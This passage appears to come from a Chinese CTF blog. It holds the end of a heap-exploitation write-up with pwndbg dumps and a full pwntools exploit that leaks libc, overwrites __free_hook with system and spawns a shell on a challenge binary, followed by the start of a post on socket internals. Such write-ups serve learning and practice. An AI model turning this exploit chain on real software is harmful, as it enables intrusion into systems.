chunk</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55ad43b41ec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55ad43b41ec0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>) <span class="comment">/* upload chunk */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55ad43b41ec8</span> ◂— <span class="number">0x501</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55ad43b41ed0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0018</span>│  <span class="number">0x55ad43b41ed8</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0020</span>│  <span class="number">0x55ad43b41ee0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>) <span class="comment">/* top chunk */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55ad43b41ee8</span> ◂— <span class="number">0x11e1</span> <span class="comment">/* top chunk-&gt;size */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55ad43b41ef0</span> ◂— <span class="number">0x0</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55ad43b41ef8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>upload</code> 执行以后，程序会释放原来的 <code>upload chunk</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55ad43b41ec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55ad43b41ec0</span> ◂— <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>) <span class="comment">/* upload chunk */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55ad43b41ec8</span> ◂— <span class="number">0x501</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55ad43b41ed0</span> —▸ <span class="number">0x7f3c1e436be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x55ad43b41f10</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55ad43b41ed8</span> —▸ <span class="number">0x7f3c1e436be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x55ad43b41f10</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55ad43b41ee0</span> ◂— <span class="number">0x0</span> <span class="comment">/* top chunk */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55ad43b41ee8</span> ◂— <span class="number">0x0</span> <span class="comment">/* top chunk-&gt;size */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55ad43b41ef0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55ad43b41ef8</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55ad43b41f00</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55ad43b41f08</span> ◂— <span class="number">0xffffffff61616161</span></span><br></pre></td></tr></table></figure>
<p>现在 unsorted bin 有了，程序会优先从 unsorted bin 中分配 chunk，现在需要考虑的问题是怎么泄露 main_arena</p>
<ul>
<li>程序的泄露点在 <code>edit</code> 中：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Info before editing:\n&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Index\tName\tScores\n&quot;</span>);</span><br><span class="line">v1 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)index);</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>edit_by_index</code> 找到目标后，会把其 “name” 和 “scores” 打印出来</li>
</ul>
<p>于是又要构建堆风水，想办法把 main_arena/heap 放到 “name” 或者 “scores” 中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">download()</span><br><span class="line">payload = <span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload,-<span class="number">1</span>)</span><br><span class="line">upload()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55a466677ec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55a466677ec0</span> ◂— <span class="string">&#x27;bbbbbbbbA&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55a466677ec8</span> ◂— <span class="number">0x41</span> <span class="comment">/* &#x27;A&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55a466677ed0</span> ◂— <span class="number">0x6363636363636363</span> (<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55a466677ed8</span> ◂— <span class="number">0xffffffff63636363</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55a466677ee0</span> ◂— <span class="number">0x0</span> <span class="comment">/* 这里将会被释放 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55a466677ee8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55a466677ef0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55a466677ef8</span> ◂— <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<ul>
<li><code>upload</code> 会释放 <code>ee0</code> 处的 chunk（为了不触发 unlink，必须要提前布置好 size）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5649a20ffec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5649a20ffec0</span> ◂— <span class="string">&#x27;bbbbbbbbA&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5649a20ffec8</span> ◂— <span class="number">0x41</span> <span class="comment">/* &#x27;A&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5649a20ffed0</span> ◂— <span class="number">0x6363636363636363</span> (<span class="string">&#x27;cccccccc&#x27;</span>) <span class="comment">/* index0 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5649a20ffed8</span> ◂— <span class="number">0xffffffff63636363</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5649a20ffee0</span> ◂— <span class="number">0x0</span> <span class="comment">/* 释放后留下了heap,可以用于泄露 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x5649a20ffee8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5649a20ffef0</span> —▸ <span class="number">0x5649a20ffeb0</span> ◂— <span class="number">0x0</span> <span class="comment">/* index2 */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5649a20ffef8</span> —▸ <span class="number">0x5649a20ee010</span> ◂— <span class="number">0x2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>至于为什么 <code>ee0</code> 处会被释放，可以把上述 exp 中的 <code>edit</code> 都注释掉，然后就会发现在正常的程序流程中，<code>ee0</code> 就是一个 <code>upload chunk</code>，执行 <code>upload</code> 后这里本来就会被释放</li>
<li>其实这也是前面伪造 unsorted bin 造成的结果，程序优先从 unsorted bin 中分配 chunk，形成了一个小的 overlapping 吧，也就绕过了如下的检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &gt;= <span class="number">0</span> &amp;&amp; index &lt; chunk_num )</span><br></pre></td></tr></table></figure>
<p>后面我想用同样的思路来构造 unsorted bin 绕过该检查，但是之前遗留下来的 unsorted bin 始终会报出各种各样的错误，下面是网上其他 exp 的构造方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;r&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>) </span><br><span class="line"><span class="comment"># &#x27;p64(0xc1)&#x27;是为了跳过unsorted chunk,避免更多的麻烦</span></span><br><span class="line"><span class="comment"># &#x27;p64(1)&#x27;是为了使P位为&#x27;1&#x27;,后面有个free会检查这里</span></span><br><span class="line">payload += <span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>*<span class="number">8</span> + p64(<span class="number">0</span>) + p32(<span class="number">0x1f1</span>) </span><br><span class="line"><span class="comment"># 修改unsorted chunk-&gt;size(为了后面的upload一次性把这个unsorted chunk申请掉)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the new name:&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the new score:&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">upload()</span><br><span class="line">download()</span><br><span class="line">payload = <span class="string">&quot;R&quot;</span>*<span class="number">0x8</span>+p64(<span class="number">0x11e1</span>) <span class="comment"># 伪造top chunk-&gt;size,足够大就行</span></span><br><span class="line">payload += <span class="string">&quot;\x00&quot;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>) <span class="comment"># 把将要free的chunk-&gt;size改大(进入unsorted bin)</span></span><br><span class="line">edit(<span class="number">0</span>,payload,<span class="number">0</span>)</span><br><span class="line">upload()</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：top chunk 存储在 main_arena+96 中，当调用 free 时， [R11] 寄存器会存储该值</li>
</ul>
<p>大佬的解决办法也很简单，<code>upload</code> 会先 malloc 后 free，只要在 malloc 的时候把 unsorted chunk 给全部申请掉，后面就不用考虑 unsorted bin 的问题了，所以需要修改一下 unsorted chunk-&gt;size</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">libcc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd  =<span class="string">&quot;b *$rebase(0x22C0)\n&quot;</span></span><br><span class="line">cmd +=<span class="string">&quot;b *$rebase(0x22CE)\n&quot;</span></span><br><span class="line">cmd +=<span class="string">&quot;b *$rebase(0x22DC)\n&quot;</span></span><br><span class="line">cmd +=<span class="string">&quot;b *$rebase(0x22EA)\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,score</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;scores&#x27;</span>,<span class="built_in">str</span>(score))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;return&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2.Remove by index&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,new_name,new_score</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;by index&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the new name:&#x27;</span>,new_name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the new score:&#x27;</span>,<span class="built_in">str</span>(new_score))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    seed = libcc.time(<span class="number">0</span>)</span><br><span class="line">    libcc.srand(seed)</span><br><span class="line">    key = <span class="string">&quot;n0_One_kn0w5_th15_passwd&quot;</span></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        v1 = i | <span class="built_in">ord</span>(key[i]) ^ <span class="number">0xF</span></span><br><span class="line">        password += <span class="built_in">chr</span>(libcc.rand() &amp; v1)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Password for admin:&quot;</span>, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_IO_str_jumps</span>():</span></span><br><span class="line">   IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">   IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">   <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">       possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">       <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">          <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x421</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0xf121</span>) + <span class="string">&quot;a&quot;</span> * <span class="number">0x3F8</span> + p64(<span class="number">0x11</span>) + <span class="string">&quot;a&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x11</span>), <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">download()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.Edit by index\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Scores\n1\t&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">&quot;\x00&quot;</span> * <span class="number">2</span>) - <span class="number">0x1ebb80</span> - <span class="number">0x60</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;name:&quot;</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;score:&quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">gadget = p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">upload()</span><br><span class="line">edit(<span class="number">0</span>, gadget * <span class="number">2</span> + p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x111</span>), <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">edit(<span class="number">0</span>, gadget * <span class="number">2</span> + p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x111</span>) + p64(free_hook - <span class="number">0x10</span>), <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> * <span class="number">2</span> + p64(system_addr) * <span class="number">2</span> + p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x111</span>) + p64(free_hook - <span class="number">0x10</span>)</span><br><span class="line">payload += gadget * <span class="number">4</span> + p64(<span class="number">0x31</span>) + gadget</span><br><span class="line">edit(<span class="number">0</span>, payload, <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="number">0</span>)                                                       </span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)             </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个堆风水真的好难弄，自己搞了好几天才 leak 出来，但是堆风水太乱不能 get shell，最后还是只能调试网上的 exp</p>
<p>最后挂的 exp 是我遇见的最简单的了，他只 leak 了 libc_base，导致堆风水简洁了不少</p>
<p>从这个题目没有学习到什么知识，就当练习了一下堆风水吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：Socket底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-06 16:56:15" itemprop="dateCreated datePublished" datetime="2022-09-06T16:56:15+08:00">2022-09-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-01 15:16:12" itemprop="dateModified" datetime="2022-10-01T15:16:12+08:00">2022-10-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Socket 基础知识</strong></p>
<p>相比于其他 IPC 方式，Socket 更牛的地方在于，它不仅仅可以做到同一台主机内跨进程通信，它还可以做到不同主机间的跨进程通信</p>
<ul>
<li>“IP+端口+协议”的组合就可以唯一标识网络中一台主机上的一个进程</li>
<li>信息依靠 <strong>操作系统和网络栈</strong> 从发送端 Socket 到接收端 Socket</li>
</ul>
<p>一个完整的 Socket 的组成应该是由<strong><code>[协议，本地地址，本地端口，远程地址，远程端口]</code></strong> 组成的一个5维数组</p>
<ul>
<li>发送端：<strong><code>[tcp，发送端IP，发送端port，接收端IP，接收端port]</code></strong></li>
<li>接收端：<strong><code>[tcp，接收端IP，接收端port，发送端IP，发送端port]</code></strong></li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641474031711-1664608572272.png" class width="1641474031711">  
<ul>
<li>函数 <code>socket</code> 用于为本进程生成一个 Socket 描述符，内核中都有一个表，保存了该进程申请并占用的所有 socket 描述符</li>
<li>服务端需要 <code>bind</code> 一个 <code>struct sockaddr</code>，其目的是为了指定一个固定的 IP/port 和地址族（因为客户端需要知道服务器基础信息才能通信）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> sin_family; <span class="comment">/* 地址族(底层用来递交数据的通信协议) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> sin_port; <span class="comment">/* 端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* 为了让sockaddr与sockaddr_in两个数据结构保持大小相同而保留的空字节 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>客户端就不需要 <code>bind</code>，而是在 <code>connect</code> 时由系统分配端口（<code>connect</code> 的参数为服务端的 <code>struct sockaddr</code>）</li>
<li>然后服务器开始监听该 port，循环执行 <code>accept</code>，并等待客户端 <code>connect</code></li>
</ul>
<p><strong>Linux 网络数据包</strong></p>
<p>网卡收包从整体上是网线中的高低电平转换到网卡 FIFO 存储，再拷贝到系统主内存的过程</p>
<p>接收数据包是一个复杂的过程，涉及很多底层的技术细节，但大致需要以下几个步骤：</p>
<ul>
<li>网卡收到数据包</li>
<li>将数据包从网卡硬件缓存转移到服务器内存中（内核缓存 <code>sk_buffer</code>）</li>
<li>通知内核处理</li>
<li>经过 TCP/IP 协议逐层处理</li>
<li>应用程序通过 <code>read</code> 从 socket buffer 读取数据</li>
</ul>
<p>这里就重点分析一下数据包传输到内核的过程：</p>
